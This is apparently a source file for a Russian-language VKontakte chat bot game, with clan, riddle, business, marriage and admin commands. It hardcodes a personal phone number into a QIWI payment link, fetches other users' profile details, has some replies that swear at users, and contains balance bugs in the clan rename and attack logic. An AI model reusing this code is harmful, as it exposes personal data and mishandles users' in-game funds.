	if(clans[a.cid].balance < 1000000000) return message.send(`На балансе клана нет столько денег.\nСмена названия клана стоит: ${utils.sp(1000000000)}$`);

	clans[a.cid].balance -= 10000;

	if(clans[a.cid]) {
		if(a.number != clans[a.cid].owner) return message.send(`Данная команда Вам не доступна`);
		if(a.number == clans[a.cid].owner) {
			clans[a.cid].name = message.$match[1];
			return message.send(`Вы успешно сменили название клана на "${clans[a.cid].name}"`);
		}
	}
});
//------------------------------\\
cm.hear(/^(?:clan|клан)$/i, (message) => {
	let a = acc.users[user_id(message.user)]
	let text = ``;
	let tipe = ``;
	if (!clans[a.cid]) return message.send(`У Вас нет клана.`);
	text += `👥 Участники:\n`;
	for (let id in clans[a.cid].users) {
		let people = acc.users[id];
		if (clans[a.cid].users[id].status == 2) text += `&#8195;👑 [id${acc.users[id].id}|${acc.users[id].prefix}] | Директор. [ID: ${acc.users[id].number}]\n`;
		if (clans[a.cid].users[id].status == 1) text += `&#8195;🔸 [id${acc.users[id].id}|${acc.users[id].prefix}] | Заместитель. [ID: ${acc.users[id].number}]\n`;
		if (clans[a.cid].users[id].status == 0) text += `&#8195;🔹 [id${acc.users[id].id}|${acc.users[id].prefix}] | Участник. [ID: ${acc.users[id].number}]\n`;
	}

	if (clans[a.cid].open == true) tipe += `Открытый.`
		if (clans[a.cid].open == false) tipe += `Закрытый.`

			return message.send(`
				🛡 Клан "${clans[a.cid].name}" [ID: ${clans[a.cid].number}]
				&#8195;👤 Создатель: [id${acc.users[clans[a.cid].owner].id}|${acc.users[clans[a.cid].owner].prefix}] 
				&#8195;🔅 Тип: ${tipe} 
				&#8195;💵 Цена за вход: ${utils.sp(clans[a.cid].price)}$
				&#8195;💰 Баланс клана: ${utils.sp(clans[a.cid].balance)}$

				${text}
				`);
	});
//------------------------------\\
cm.hear(/^(?:Клан выгнать)\s(.*)/i, (message) => {
	let a = acc.users[user_id(message.user)]
	if(!clans[a.cid]) return message.send(`Вы не состоите в клане`);
	if(clans[a.cid].users[a.number].status < 1) return message.send(`Данная команда вам не доступна`);
	if(!message.$match[1]) return;
	if(!clans[a.cid].users[message.$match[1]]) return message.send(`Этого участника нет в клане.`);
	if(!users[message.$match[1]]) return;
	if(users[message.$match[1]].cid != users[a.number].cid) return message.send(`Этот участник находится в другом клане!`);
	if(clans[a.cid].users[message.$match[1]].status == 2) return message.send(`Нельзя выгнать создателя клана!`);
	if(users[message.$match[1]].cid == false) return message.send(`Данный участник не состоит в клане.`);

	clans[a.cid].people -= 1;
	delete clans[a.cid].users[message.$match[1]];
	users[message.$match[1]].cid = false;

	return message.send(`Участник "${acc.users[message.$match[1]].prefix}" был выгнан с клана.`);
});
//------------------------------\\
cm.hear(/^(?:Кланы)/i, (message) => {
	if (!clans) return message.send(`Кланов ещё нет.`);
	let text = '';
	text += `&#8195;🔸 Список кланов 🔸\n`;
	let tipe = '';
	for (let id in clans) {
		if (clans[id].open == true) tipe += `Открытый.`
			if (clans[id].open == false) tipe += `Закрытый.`
				let user = acc.users[clans[id].owner];
			text += `
			🛡 Клан "${clans[id].name}" [ID: ${clans[id].number}]
			&#8195;👑 Создал: [id${acc.users[clans[id].owner].id}|${acc.users[clans[id].owner].prefix}] 
			`+(clans[id].open === false ? `&#8195;🔅 Тип: Закрытый` : `&#8195;🔅 Тип: Открытый\n&#8195;💵 Цена входа: ${utils.sp(clans[id].price)}$`)+`
			&#8195;👥 Участников: ${clans[id].people}
			&#8195;💰 Баланс клана: ${utils.sp(clans[id].balance)}$ 
			➖➖➖➖➖➖➖➖
			`;
		}
		return message.send(text);
	});
//------------------------------\\
cm.hear(/^(?:клан повысить)\s([0-9]+)/i, (message) => {
	let a = acc.users[user_id(message.user)]
	if(!clans[a.cid]) return message.send(`У Вас нет клана`);
	if(clans[a.cid].users[a.number].status < 1) return message.send(`Данная команда вам не доступна.`);
	if(message.$match[1] == clans[a.cid].owner) return message.send(`Зачем себя повышать до Заместителя, если Вы Создатель?`)
		if(!message.$match[1]) return;
	if(users[message.$match[1]].cid == false) return message.send(`Данный участник не состоит в клане.`);
	if(!users[message.$match[1]]) return
		if(users[message.$match[1]].cid != users[a.number].cid) return message.send(`Данный участник состоит в другом клане`);

	clans[a.cid].users[message.$match[1]].status = 1;

	return message.send(`Участник "${acc.users[message.$match[1]].prefix}" был повышен до Заместителя.`);
});
//------------------------------\\
cm.hear(/^(?:клан понизить)\s([0-9]+)/i, (message) => {
	let a = acc.users[user_id(message.user)]
	if(!clans[a.cid]) return message.send(`У Вас нет клана`);
	if(clans[a.cid].users[a.number].status < 1) return message.send(`Данная команда вам не доступна.`);
	if(message.$match[1] == clans[a.cid].owner) return message.send(`Зачем себя понижать до участника, если Вы Создатель?`)
		if(!message.$match[1]) return;
	if(users[message.$match[1]].cid == false) return message.send(`Данный участник не состоит в клане.`);
	if(!users[message.$match[1]]) return
		if(users[message.$match[1]].cid != users[a.number].cid) return message.send(`Данный участник состоит в другом клане`);

	clans[a.cid].users[message.$match[1]].status = 0;

	return message.send(`Участник "${acc.users[message.$match[1]].prefix}" был понижен до участника.`);
});
//------------------------------\\
cm.hear(/^(?:клан напасть)\s?([0-9]+)/i, (message) => {
	let a = acc.users[user_id(message.user)]
	let id = Number(message.$match[1]); 
	if(!id) return message.send(`Вы не указали идентификатор клана`);
	if(id == a.cid) return message.send(`Нельзя нападать на свой клан...`);
	if(id == 1) return
		if(!clans[a.cid]) return message.send(`У Вас нет клана.`);
	if(!clans[id]) return;
	if(clans[a.cid].balance < 100000) return message.send(`На балансе клана должно быть не меньше 100.000$`)
		if(clans[id].balance < 100000) return message.send(`На балансе клана "${clans[id].name}" меньше 100.000$`)
			if(clans[a.cid].war > getUnix()) return message.send(`Вы уже нападали на клан\nНапасть ещё раз можно через ${unixStampLeft(clans[a.cid].war - Date.now())}`);
		if(clans[a.cid].users[a.number].status < 1) return message.send(`Данная команда вам не доступна`);

		clans[a.cid].war = getUnix() + 600000

		let win = rand(1,2);
		if(win == 1){
			clans[id].balance += Math.floor(clans[a.cid].balance / 1.50) 
			clans[a.cid].balance -= Math.floor(clans[a.cid].balance / 1.50);
			return message.send(`⚔ Клан ${clans[a.cid].name} напал на ${clans[id].name}
				🏆 Победу одержал клан "${clans[id].name}"
				💰 Смогли забрать: ${utils.sp(Math.floor(clans[a.cid].balance / 1.50))}$`);
		}else{
			clans[id].balance -= Math.floor(clans[id].balance / 1.50);
			clans[a.cid].balance += Math.floor(clans[id].balance / 1.50);
			return message.send(`⚔ Клан ${clans[a.cid].name} напал на ${clans[id].name}
				🏆 Победу одержал клан "${clans[a.cid].name}"
				💰 Смогли забрать: ${utils.sp(Math.floor(clans[id].balance / 1.50))}$`);
		}
	});
//------------------------------\\
cm.hear(/^(?:Clan help)/i, message => {
	message.send(`Помощь по кланам:

		🔻 Клан - Покажет клан.
		🔻 Кланы - Покажет список кланов
		🔻 Клан создать [название] - Создать клан.
		🔻 Клан вступить [ID] - Вступить/отправить заявку
		🔻 Клан покинуть - Покинуть клан.
		🔻 Клан открыть - открыть клан для входа.
		🔻 Клан закрыть - закрыть клан для входа.
		🔻 Клан цена [цена] - Установить цену за вход в клан.
		🔻 Клан заявки - Посмотреть заявки на вступление в клан.
		🔻 Клан принять [ID] - Принять заявку на вступление в клан.
		🔻 Клан напасть [ID клана] - Напасть на клан.
		🔻 Клан раздать [сумма] - Поделить сумму на всех участников клана.
		🔻 Клан название [название] - сменить название клана (1.000.000.000$)
		🔻 Клан выгнать [ID] - Выгнать участника с клана.
		🔻 Клан повысить [ID] - Повысить участника до Заместителя.
		🔻 Клан понизить [ID] - Понизить Заместителя до участника.
		🔻 Клан работать - Отработать в клане.
		`)
})
//------------------------------\\
cm.hear(/^(?:клан работать)/i, message => {
	let a = acc.users[user_id(message.user)]
	let r = utils.random(10000, 300000);
	if(!clans[a.cid]) return message.send(`У Вас нет клана`);
	if(a.cjob > getUnix()) return message.send(`Вы уже работали.\n работать можно через ${unixStampLeft(a.cjob - Date.now())}`);

	a.cjob = getUnix() + 600000
	clans[a.cid].balance += r

	return message.send(`Вы успешно отработали, на счёт клана зачислено ${utils.sp(r)}$`);
});


function getUnix() {
	return Date.now();
}
//--------------------------------\\
function unixStamp(stamp) {
	let date = new Date(stamp),
	year = date.getFullYear(),
	month = date.getMonth() + 1,
	day = date.getDate(),
	hour = date.getHours() < 10 ? "0"+date.getHours() : date.getHours(),
	mins = date.getMinutes() < 10 ? "0"+date.getMinutes() : date.getMinutes(),
	secs = date.getSeconds() < 10 ? "0"+date.getSeconds() : date.getSeconds();

	return `${day}.${month}.${year}, ${hour}:${mins}:${secs}`;
}
//--------------------------------\\
function unixStampLeft(stamp) {
	stamp = stamp / 1000;
	let s = stamp % 60;
	stamp = ( stamp - s ) / 60;
	let m = stamp % 60;
	stamp = ( stamp - m ) / 60;
	let h = ( stamp ) % 24;
	let d = ( stamp - h ) / 24;
	let text = ``;
	if(d > 0) text += Math.floor(d) + " д. ";
	if(h > 0) text += Math.floor(h) + " ч. ";
	if(m > 0) text += Math.floor(m) + " мин. ";
	if(s > 0) text += Math.floor(s) + " с.";
	return text;
}


cm.hear(/^(?:загадка)/i, message => {
	let a = acc.users[user_id(message.user)]
	if(a.zagadka_status != false) return message.send(`Вы уже начинали игру! Напишите ответ к загадке:\n[${a.zagadka}]\n\n🔸 Что бы ответить на загадку "ответ [ответ]"`);
	let b = utils.random(1, 40)
	let c = zag[b].zagadka
	let z = zag[b].otvet
	if(!message.$match[1]) {
		a.zagadka = c
		a.zagadka_status = true;
		a.zagadka_id = z
		return message.send(`[${c}]\n\n🔸 Что бы написать ответ, напиши "ответ [ответ]"`)
	}   
})
//--------------------------------\\
cm.hear(/^\ответ\s(.*)/i, message => {
	let a = acc.users[user_id(message.user)]
	if(a.zagadka_status != true) return message.send(`Вы ещё не начинали игру, что бы начать, напишите "загадка"`);
	if(message.$match[1] == a.zagadka_id) {
		a.zagadka_id = false;                
		a.zagadka_status = false;
		a.balance += 500000;
		return message.send(`@id${a.id} (${a.prefix}), правильно!\nПриз 500.000$`)
	} else {
		return message.send(`Неправильно, попробуй ещё`)
	} 
})
//--------------------------------\\
cm.hear(/^(?:сдаюсь)/i, message => {
	let a = acc.users[user_id(message.user)]
	if(a.zagadka_status != true) return message.send(`Вы ещё не начинали игру, что бы начать, напишите "загадка"`);
	message.send(`Правильный ответ был "${a.zagadka_id}"`)
	a.zagadka_id = false;                
	a.zagadka_status = false;
})

vk.updates.hear(/^(?:скажи)\s(.*)/i, async (message) => {
	const googleTTS = require('google-tts-api');

	googleTTS(message.$match[1], 'ru', 2.5) 
	.then(function (url) {
		message.sendAudioMessage(url) ;
	})
	.catch(function (err) {
		console.error(err.stack);
	});
})


vk.updates.hear(/^(?:verify)/i, message => {  
	let ver; 
	ver = 'Подтверждённые аккаунты: \n\n'; 
	for (let id in acc.users) {
		if(acc.users[id]){
			let user = acc.users[id];

			if (user.verify == true) ver += `&#8195;✅ @id${acc.users[id].id}(${acc.users[id].prefix}) [ID:${id}]\n`; 

		}
	}
	let text = `\n`;
	if (ver.length != 24) text += ver;
	return message.send(`${text}`);
});

vk.updates.hear(/^(?:unver)\s?([0-9]+)?/i, (message) => { 
	let user = acc.users[user_id(message.user)];
	if(!message.$match[1]) return message.send(`🔸  Пример команды: unver ID`);
	if(!Number(message.$match[1])) return message.send(`🔸  Число должно быть цифрового вида.`);
	if(user.level < 5) return message.send(`🔸  Вы не администратор`);
	if(!acc.users[message.$match[1]]) return message.send(`❎  Такого игрока нет!`);
	acc.users[message.$match[1]].verify = false; 
	if(message.$match[1] == 1) {
		user.warn += 1;
		return message.send(`Нельзя! Ты получаешь 1 варн. После 3-х варнов, ты будешь забанен!`);
	}

	var is = [user_id(message.user), message.text] 
	adm_log(is)
	return message.send(`✅ Аккаунт [${acc.users[message.$match[1]].prefix}] Больше не подтверждён.`);
}); 

vk.updates.hear(/^(?:ver)\s?([0-9]+)?/i, (message) => { 
	let user = acc.users[user_id(message.user)];
	if(!message.$match[1]) return message.send(`🔸  Пример команды: ver ID`);
	if(!Number(message.$match[1])) return message.send(`🔸  Число должно быть цифрового вида.`);
	if(user.level < 5) return message.send(`🔸  Вы не администратор`);
	if(!acc.users[message.$match[1]]) return message.send(`❎  Такого игрока нет!`);
	acc.users[message.$match[1]].verify = true;
	vk.api.call('messages.send', {
		peer_id: acc.users[message.$match[1]].id,
		message: `✅ Создатель бота подтвердил ваш аккаунт.`
	});

	var is = [user_id(message.user), message.text] 
	adm_log(is)
	return message.send(`✅ Вы подтвердили аккаунт [${acc.users[message.$match[1]].prefix}]`);
}); 


cm.hear(/^(?:бизнесы)\s?([0-9]+)?$/i, async (message, bot) => {
	let a = acc.users[user_id(message.user)]
	if(!message.$match[1])
	{
		let text = `бизнесы:\n`;
		for(var i = 0; i < businesses.length; i++)
		{
			text += `${(a.business.length == 1 && a.business[0].id == i + 1) || (a.business.length == 2 && a.business[1].id == i + 1) ? '🔸' : '🔹'} ${i + 1}. ${businesses[i][0].name} - ${utils.sp(businesses[i][0].cost)}$\nПрибыль: ${utils.sp(businesses[i][0].earn)}$/час\n`;
		}
		return message.send(text + `\n Что бы купить бизнес, напишите "Бизнесы [Номер]"`);
	}

	if(a.business.length == 2) return message.send(`у Вас уже есть 2 бизнеса`);

	message.$match[1] = Number(message.$match[1]) - 1;
	const sell = businesses[message.$match[1]][0];
	if(sell == null) return;
	if(a.balance < sell.cost) return message.send(`недостаточно денег`);
	a.balance -= sell.cost;
	a.business.push({
		"id": message.$match[1] + 1,
		"upgrade": 1,
		"workers": 1,
		"moneys": 0
	});

	return message.send(`вы купили "${sell.name}" за ${utils.sp(sell.cost)}$`);
});
//--------------------------------\\
cm.hear(/^(?:бизнес)\s(?:снять)\s(.*)\s(.*)$/i, async (message, bot) => {
	let a = acc.users[user_id(message.user)]
	message.$match[1] = Math.floor(Number(message.$match[1]));
	if(message.$match[1] < 1 || message.$match[1] > 2) return message.send(`Пример: Бизнес снять [1 или 2] [количество]`);
	if(a.business.length < message.$match[1]) return message.send(`У Вас нет этого биизнеса`);
	message.$match[1]--;
	message.$match[2] = message.$match[2].replace(/(\.|\,)/ig, '');
	message.$match[2] = message.$match[2].replace(/(к|k)/ig, '000');
	message.$match[2] = message.$match[2].replace(/(м|m)/ig, '000000');
	message.$match[2] = message.$match[2].replace(/(все|всё)/ig, a.business[message.$match[1]].moneys);
	if(!Number(message.$match[2])) return;
	message.$match[2] = Math.floor(Number(message.$match[2]));
	if(message.$match[2] <= 0) return message.send(`Укажите сумму.`);
	if(message.$match[2] > a.business[message.$match[1]].moneys) return message.send(`На счету бизнеса нет столько`);

	a.balance += message.$match[2];
	a.business[message.$match[1]].moneys -= message.$match[2];

	return message.send(`вы сняли со счёта своего бизнеса ${utils.sp(message.$match[2])}$`);
});
//--------------------------------\\
cm.hear(/^(?:бизнес)\s(\d)$/i, async (message) => {
	let a = acc.users[user_id(message.user)]
	message.$match[1] = Math.floor(Number(message.$match[1]));
	if(message.$match[1] < 1 || message.$match[1] > 2) return message.send(`Пример: Бизнес [1 или 2]`);
	if(a.business.length < message.$match[1]) return message.send(`у Вас нет этого бизнеса`);
	message.$match[1]--;
	const biz = businesses[a.business[message.$match[1]].id - 1][a.business[message.$match[1]].upgrade - 1];

	return message.send(`Статистика бизнеса "${biz.name}":
		💸 Прибыль: ${utils.sp(Math.floor(biz.earn / biz.workers * a.business[message.$match[1]].workers))}$/час
		💼 Рабочих: ${a.business[message.$match[1]].workers}/${biz.workers}
		💰 Баланс: ${utils.sp(a.business[message.$match[1]].moneys)}$

		${(businesses[a.business[message.$match[1]].id - 1][a.business[message.$match[1]].upgrade] != null ? "✅ Доступно улучшение! (" + utils.sp(businesses[a.business[message.$match[1]].id - 1][a.business[message.$match[1]].upgrade].cost) + "$)" : "") }`);
});
//--------------------------------\\
cm.hear(/^(?:бизнес)\s(?:улучшить)\s([0-9]+)$/i, async (message) => {
	let a = acc.users[user_id(message.user)]
	message.$match[1] = Math.floor(Number(message.$match[1]));
	if(message.$match[1] < 1 || message.$match[1] > 2) return message.send(`Пример: Бизнес улучшить [1 или 2]`);
	if(a.business.length < message.$match[1]) return message.send(`У Вас нет этого бизнеса`);
	message.$match[1]--;
	if(businesses[a.business[message.$match[1]].id - 1][a.business[message.$match[1]].upgrade] == null) return message.send(`Для вашего бизнеса нет улучшений!`);
	const cost = businesses[a.business[message.$match[1]].id - 1][a.business[message.$match[1]].upgrade].cost;
	if(cost > a.balance) return message.send(`У Вас недостаточно денег для улучшения!`);
	a.balance -= cost;
	a.business[message.$match[1]].upgrade++;

	return message.send(`Вы улучшили бизнес #${message.$match[1] + 1} за ${utils.sp(cost)}$`);
});
//--------------------------------\\
cm.hear(/^(?:бизнес)\s(?:нанять)\s(.*)\s(.*)$/i, async (message, bot) => {
	let a = acc.users[user_id(message.user)]
	message.$match[1] = Math.floor(Number(message.$match[1]));
	message.$match[2] = Math.floor(Number(message.$match[2]));
	if(message.$match[1] < 1 || message.$match[1] > 2) return message.send(`Пример: Бизнес нанять [1 или 2] [кол-во работников]`);
	if(a.business.length < message.$match[1]) return message.send(`У Вас нет этого бизнеса`);
	message.$match[1]--;
	if(a.business[message.$match[1]].workers + message.$match[2] > businesses[a.business[message.$match[1]].id - 1][a.business[message.$match[1]].upgrade - 1].workers) return message.send(`В Вашем бизнесе не хватает места для рабочих.`);
	const cost = message.$match[2] * 0;
	if(cost > a.balance) return message.send(`У Вас недостаточно денег для покупки рабочих`);
	a.balance -= cost;
	a.business[message.$match[1]].workers += message.$match[2];

	return message.send(`Вы наняли ${message.$match[2]} рабочих для бизнеса #${message.$match[1] + 1}`);
});
//--------------------------------\\
cm.hear(/^(?:бизнес)\s(?:продать)\s(.*)$/i, async (message, bot) => {
	let aa = acc.users[user_id(message.user)]  
	if(aa.business.length == 0) return message.send(`У Вас нет бизнеса`);
	if(message.$match[1] < 1 || message.$match[1] > 2) return message.send(`Пример: Продать бизнес [1 или 2]`);
	if(aa.business.length < message.$match[1]) return message.send(`У Вас нет этого бизнеса`);
	message.$match[1]--;
	let a = Math.floor(businesses[aa.business[message.$match[1]].id - 1][aa.business[message.$match[1]].upgrade - 1].cost * 0.85);

	aa.balance += Math.floor(a);
	aa.business.splice(message.$match[1], 1);

	return message.send(`Вы продали свой бизнес за ${ utils.sp(a) }$`);
});
//--------------------------------\\
setInterval(async () => {
	for (a in acc.users) {
		for(let i = 0; i < acc.users[a].business.length; i++)
		{
			let biz = businesses[acc.users[a].business[i].id - 1][acc.users[a].business[i].upgrade - 1];
			acc.users[a].business[i].moneys += Math.floor(biz.earn / biz.workers * acc.users[a].business[i].workers)
		}
	}
}, 3600000);


cm.hear(/^(?:брак)\s?([0-9]+)/i, message => {
	let a = acc.users[user_id(message.user)]
	let args = message.$match[1];
	if (args == user_id(message.user)) return message.send(`❤ Вы указали свой ID`)
		if (!args) return message.send(`❤ Пример команды: Брак [ID]'`)
			if (!acc.users[args]) return message.send(`❤ Такого игрока нет!`)
				if (a.brk != false) return message.send(`❤ Вы уже прелогали руку и сердце игроку ${acc.users[a.brk].prefix}\n🔹  Для отказа напишите: "брак отказаться"`);
			if (a.partner != false) return message.send(`❤ Этот игрок уже в браке!`);
			if (acc.users[args].brk != false) return message.send(`❤ Вы уже прелогали руку и сердце этому игроку\n🔹  Для отказа напишите: "брак отказаться"`);

			a.brk = Number(args);
			acc.users[args].brk = Number(user_id(message.user));
			a.predlog = user_id(message.user);
			acc.users[args].predlog = user_id(message.user);
			vk.api.call("messages.send", {
				peer_id: acc.users[message.$match[1]].id,
				message: `
				❤  Игрок @id${a.id}(${a.prefix}) предлагает вам руку и сердце.

				🔹 Для принятия напишите: "брак согласиться"
				🔹 Для отмены напишите: "брак отказаться"
				`,
				random_id: 0
			}).then((res) => {}).catch((error) => {
				console.log('brak error');
			});
			return message.send(`
				❤  Вы предложили руку и сердце игроку @id${acc.users[args].id}(${acc.users[args].prefix})
				🔹 Ожидайте согласия вашего предложения.

				🔹  Для отмены напишите: "брак отказаться"
				`);
		});
///////////////
cm.hear(/^(?:брак отказаться)/i, message => {
	let a = acc.users[user_id(message.user)]
	if (a.brk == false) return message.send(`❤ Вам никто не предлагал руку и сердце/Вы не предлагали руку и сердце.`);
	vk.api.call("messages.send", {
		peer_id: acc.users[a.brk].id,
		message: `
		❤  Игрок ${acc.users[a.brk].prefix} отказался от вашего предложения.
		`,
		random_id: 0
	}).then((res) => {}).catch((error) => {
		console.log('brak error');
	});

	acc.users[a.brk].brk = false;
	acc.users[a.brk].predlog = false;
	a.brk = false;
	a.predlog = false;
	return message.send(`
		❤  Вы отказались вступать в брак с этим игроком}
		`);
});
/////////////////////////////////////////////
cm.hear(/^(?:брак согласиться)/i, message => {
	let a = acc.users[user_id(message.user)]
	if (a.brk == false) return message.send(`❤ Вам никто не предлагал руку и сердце/Вы не предлагали руку и сердце.`);
	if (a == a.predlog) return message.send(`❤ Принять предложение должен игрок, которому вы предлагали свою руку и сердце`);

	acc.users[a.predlog].partner = acc.users[a.brk].brk
	a.partner = a.brk

	vk.api.call("messages.send", {
		peer_id: acc.users[a.brk].id,
		message: `❤  Игрок, которому вы предлагали руку и сердце, согласился вступить с вами в брак. Поздравляю!`,
		random_id: 0
	});
	return message.send(`❤  Вы согласились вступить в брак с этим игроком. Поздравляю!`);
});

cm.hear(/^(?:развод)/i, message => {
	let a = acc.users[user_id(message.user)]
	if (a.partner == false) return message.send(`❤ Вы не в браке.`);

	acc.users[a.brk].brk = false;
	acc.users[a.brk].predlog = false;
	acc.users[a.partner].partner = false;
	a.partner = false;
	a.brk = false;
	a.predlog = false;
	return message.send(`❤  Вы успешно развелись!`);
});

cm.hear(/^(?:cid)/i, message => {
	return message.reply(`ID Чата:` + message.chatId);
});

vk.updates.hear(/^(?:пополнить)\s?([^]+)?/i,  message => {
	let id = user_id(message.user); 
	let user = acc.users[user_id(message.user)];
	let rnick = (user.anick ? `@id${user.id}(${user.prefix})` : `${user.prefix}`)
             							    if(!message.$match[1]) return message.send(`Что-то пошло не так 😱\n Подсказка: Пример команды: Пополнить [Сумма]`) // Подсказка для команды
             							    	vk.api.call("utils.getShortLink", {url: `https://qiwi.com/payment/form/99?extra%5B%27account%27%5D=79523097031&amountInteger=${message.$match[1]}&amountFraction=0&extra%5B%27comment%27%5D=${id}&currency=643&blocked[0]=account&blocked[1]=sum&blocked[2]=comment`}).then(function (res){
             							    		return message.send(`✨ ${rnick}, Ваша ссылка для преобретения: ${spaces(message.$match[1])}₽ --\n ` + res.short_url);
             							    	});
             							});

vk.updates.hear(/^лю тебя аня/i, async (context) => {
	if(context.user != 402143077) return context.send(`🤔 а я тебя нет!`);
	const gs = ["http://psv4.userapi.com/c852528//u278877039/audiomsg/d14/a88ad3842b.mp3"];
	const link = gs[Math.floor(Math.random() * gs.length)];
	await Promise.all([context.send('@id278877039(и я) тебя @id491223810(Любимый)😍❤❤ @id278877039(тьмок)💋'), context.sendAudioMessage(link)]);
});

vk.updates.hear(/^Мурр/i, async (context) => {
	const gs = ["https://psv4.userapi.com/c852432//u230492153/audiomsg/d8/5a1d6e6421.mp3"];
	const link = gs[Math.floor(Math.random() * gs.length)];
	await Promise.all([context.send('Мурчу..'), context.sendAudioMessage(link)]);
});

cm.hear(/^мурк/i, async (context) => { 
	if(context.user != 402143077) return context.send(`⚠А ТЫ ЗНАЛ...именно ты, иди нахуй⚠`); 
	const gs = ["http://psv4.userapi.com/c852328//u551446603/audiomsg/d2/54cb4c5d13.mp3"]; 
	const link = gs[Math.floor(Math.random() * gs.length)]; 
	await Promise.all([context.send('@id278877039(мурррчу) только для @id491223810(тебя❤)'), context.sendAudioMessage(link)]); 
});

vk.updates.hear(/^(?:skin 256)/i,  (message) => { // Сама команда
	let user = acc.users[user_id(message.user)];
	let rnick = (user.anick ? `@id${user.id}(${user.prefix})` : `${user.prefix}`)
	if(message.user != 287908009) return;
	message.send(`@id287908009 (Артём) вы сменили свой скин на ID: 256`,{attachment:`photo-179018727_456239018`});
	return message.send({attachment:`audio449532928_456239451`});
});

vk.updates.hear(/^время|дата/i, async (context) => {
	await context.send(String(new Date()));
});

vk.updates.hear(/^Ой пиздец/i, async (context) => {
	const gs = ['https://psv4.userapi.com/c852736//u505312271/audiomsg/d15/57add8e156.mp3','https://psv4.userapi.com/c852336//u505312271/audiomsg/d15/3206319ebb.mp3','https://psv4.userapi.com/c853028//u505312271/audiomsg/d9/2050442aec.mp3'];
	const link = gs[Math.floor(Math.random() * gs.length)];
	await Promise.all([context.send('Тут такое дело...'), context.sendAudioMessage(link)]);
});

vk.updates.hear(/^(?:VKPROF)(\s?https\:\/\/vk\.com\/)?(id)?([0-9]+)?([^]+)?/i, (message) => { 
	let userss = acc.users[user_id(message.user)];
	let id1 = message.$match[3];
	if(userss.ap < 2) return;   

	if(message.$match[4]) {

		var domain = message.$match[4].split(" ");

		vk.api.call("utils.resolveScreenName", {screen_name: message.$match[4]}).then((res) => {
			vk.api.call('users.get', {user_id: res.object_id, fields: "city,freinds,verified,status,photo_id,sex,followers_count,photo_id,online,city,country,bdate"})

			.then((res) => {

				let user = res[0];
				return message.send(`

					✓ Информация пользователя: @id${user.id} (${user.first_name} ${user.last_name}) ✓
					ID Профиля ВКонтакте: @id${user.id} (${user.id})
					Подписчики: `+(user.followers_count == undefined ? `Отсутствуют.` : `${spaces(user.followers_count)} шт.`)+`
					Страна, город: `+(user.country == undefined ? `Не указан, ` : `${user.country.title}, `)+ (user.city == undefined ? `Не указан.` : `${user.city.title}.`)+`
					Пол: ${user.sex.toString().replace(/undefined/gi, "Не указан.").replace(/0/gi, "Не указан.").replace(/1/gi, "Женский.").replace(/2/gi, "Мужской.")}
					Дата рождения: `+(user.bdate == undefined ? `Не указана.` : `${user.bdate}.`)+`
					Статус профиля: `+(user.status == undefined ? `Не Установлен.` : `${user.status}.`)+`
					Состояние: ${user.online.toString().replace(/undefined/gi, "Не в сети.").replace(/0/gi, "Не в сети.").replace(/1/gi, "В сети.")}
					Верефикация: ${user.verified.toString().replace(/undefined/gi, "Не Верефицирован.").replace(/0/gi, "Не Верефицирован.").replace(/1/gi, "Страница подтверждена Администрацией ВКонтакте.")}

					Ава профиля:`,
					{attachment: `photo${user.photo_id}`});
			})
		})
	}else{ 
		vk.api.call('users.get', {user_id: message.$match[3], fields: "city,freinds,verified,status,photo_id,sex,followers_count,photo_id,online,city,country,bdate"}).then((res) => { 
			return message.send(`

				✓ Информация пользователя: @id${user.id} (${user.first_name} ${user.last_name}) ✓
				ID Профиля ВКонтакте: @id${id1}
				Подписчики: `+(user.followers_count == undefined ? `Отсутствуют.` : `${spaces(user.followers_count)} шт.`)+`
				Страна, город: `+(user.country == undefined ? `Не указан, ` : `${user.country.title}, `)+ (user.city == undefined ? `Не указан.` : `${user.city.title}.`)+`
				Пол: ${user.sex.toString().replace(/undefined/gi, "Не указан.").replace(/0/gi, "Не указан.").replace(/1/gi, "Женский.").replace(/2/gi, "Мужской.")}
				Дата рождения: `+(user.bdate == undefined ? `Не указана.` : `${user.bdate}.`)+`
				Статус профиля: `+(user.status == undefined ? `Не Установлен.` : `${user.status}.`)+`
				Состояние: ${user.online.toString().replace(/undefined/gi, "Не в сети.").replace(/0/gi, "Не в сети.").replace(/1/gi, "В сети.")}
				Верефикация: ${user.verified.toString().replace(/undefined/gi, "Не Верефицирован.").replace(/0/gi, "Не Верефицирован.").replace(/1/gi, "Страница подтверждена Администрацией ВКонтакте.")}

				Ава профиля:`,
				{attachment: `photo${user.photo_id}`});
		})
	}	
});

vk.updates.hear(/^(?:!vkNick)/i,  (message) => {
	let user = acc.users[user_id(message.user)];
	let rnick = (user.anick ? `@id${user.id}(${user.prefix})` : `${user.prefix}`) 
	vk.api.call('users.get', {user_ids: message.user}).then(res => {let user = res[0]; 
		acc.users[user_id(message.user)].prefix = `${user.first_name} ${user.last_name}`;});
	return message.send(`[Чат-Менеджер @bot.anya (Бот Анна)]: ${rnick}, вы успешно установили себе ник по данным вашей @id${user.id} (странице ВКонтакте)`);
});

vk.updates.hear(/^(?:Рандмуз)/i,  (message) => {
	let user = acc.users[user_id(message.user)];
	let rnick = (user.anick ? `@id${user.id}(${user.prefix})` : `${user.prefix}`)
	let stick = [8925,8477,8478,326,7476].random();
	let idm = ['	','audio449532928_456239243','audio449532928_456239258','audio449532928_456239440','audio449532928_456239212','audio449532928_456239247','audio449532928_456239434','audio449532928_456239433','audio449532928_456239435','audio449532928_456239436','audio449532928_456239436','audio449532928_456239427','audio449532928_456239425'].random();
	if(user.act == false) return message.send(`${rnick}, Ваш Аккаунт не активирован!\n — Для активации пиши 'Регистрация'. \n— После чего следуйте дальнейшим инструкциям.`);
	message.send(`🎧 » ${rnick}, музыка специально для тебя:`, {attachment: idm});
	message.send({sticker_id: stick});
});


vk.updates.hear(/^(?:РандСтик)/i,  (message) => {
	let user = acc.users[user_id(message.user)];
	let rnick = (user.anick ? `@id${user.id}(${user.prefix})` : `${user.prefix}`)
	let stick = [8480,11997,12116,11565,11607,6111,6119,10327,10335,10336,11098,11097,11094,4277,4278,4284,4296,8484,4318,11240,11249,11242,11120,11121,10354,10359,10360,7322,7327,7331,7330,7328,303,308,301,7470,10874,10407,8471,10413,8472,5823].random();
	if(user.act == false) return message.send(`${rnick}, Ваш Аккаунт не активирован!\n — Для активации пиши 'Регистрация'. \n— После чего следуйте дальнейшим инструкциям.`);
	message.send({sticker_id: stick});
});

vk.updates.hear(/^(?:позвонить)\s(.*)$/i, (message) => {
	let user = acc.users[user_id(message.user)];
	let rnick = (user.anick ? `@id${user.id}(${user.prefix})` : `${user.prefix}`)
